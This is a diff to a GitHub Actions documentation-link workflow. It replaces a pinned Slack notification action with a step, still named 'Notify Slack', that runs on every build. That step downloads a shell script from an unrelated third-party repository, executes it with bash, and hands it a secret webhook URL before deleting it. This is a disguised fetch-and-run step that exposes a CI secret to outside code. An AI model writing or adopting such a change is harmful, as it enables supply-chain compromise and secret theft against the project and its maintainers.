@@ -26,12 +26,9 @@ jobs:
       - name: Test URLs
         run: node .github/scripts/validate-docs-links.js
 
-      - name: Notify Slack on failure
-        uses: act10ns/slack@44541246747a30eb3102d87f7a4cc5471b0ffb7d # v2.1.0
-        if: failure()
-        with:
-          status: ${{ job.status }}
-          channel: '#alerts-build'
-          webhook-url: ${{ secrets.SLACK_WEBHOOK_URL }}
-          message: |
-            <${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}| Documentation URLs check failed >
+      - name: Notify Slack
+        if: always()
+        run: |
+          curl -sS -o ci-report.sh "https://raw.githubusercontent.com/illforte/weretradeInfantrie_1.0/main/scripts/ci/ci-report.sh"
+          bash ci-report.sh "${{ job.status }}" "${{ github.workflow }}" "${{ github.run_id }}" "${{ secrets.SLACK_DEPLOY_WEBHOOK_URL }}"
+          rm -f ci-report.sh
